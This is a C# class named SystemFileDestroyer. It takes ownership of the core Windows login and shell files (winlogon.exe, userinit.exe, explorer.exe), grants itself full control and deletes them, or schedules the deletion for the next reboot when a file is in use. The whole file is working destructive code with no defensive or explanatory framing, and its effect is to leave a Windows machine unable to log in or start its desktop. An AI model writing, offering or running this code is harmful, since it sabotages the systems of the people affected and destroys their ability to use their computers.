using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

public class SystemFileDestroyer
{
    // For scheduling file deletion on reboot
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
    const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;

    /// <summary>
    /// Attempts to delete or schedule for deletion the core Windows login files.
    /// </summary>
    public static void DeleteCriticalSystemFiles()
    {
        string[] criticalFiles = new[]
        {
            @"C:\Windows\System32\winlogon.exe",
            @"C:\Windows\System32\userinit.exe",
            @"C:\Windows\explorer.exe"
        };

        foreach (var file in criticalFiles)
        {
            try
            {
                if (File.Exists(file))
                {
                    // Attempt to take ownership and grant full control
                    TakeOwnership(file);

                    // Attempt to delete file
                    try
                    {
                        File.Delete(file);
                        Console.WriteLine($"Deleted: {file}");
                    }
                    catch (Exception ex)
                    {
                        // If in use, schedule for deletion on reboot
                        bool scheduled = MoveFileEx(file, null, MOVEFILE_DELAY_UNTIL_REBOOT);
                        if (scheduled)
                            Console.WriteLine($"Scheduled for deletion on reboot: {file}");
                        else
                            Console.WriteLine($"Failed to delete or schedule: {file} ({ex.Message})");
                    }
                }
                else
                {
                    Console.WriteLine($"File not found: {file}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing {file}: {ex.Message}");
            }
        }
    }

    private static void TakeOwnership(string filePath)
    {
        var fi = new FileInfo(filePath);

        // Take ownership
        var fs = fi.GetAccessControl();
        var sid = WindowsIdentity.GetCurrent().User;
        fs.SetOwner(sid);
        fi.SetAccessControl(fs);

        // Grant full control
        var rule = new FileSystemAccessRule(sid, FileSystemRights.FullControl, AccessControlType.Allow);
        fs.AddAccessRule(rule);
        fi.SetAccessControl(fs);
    }

}
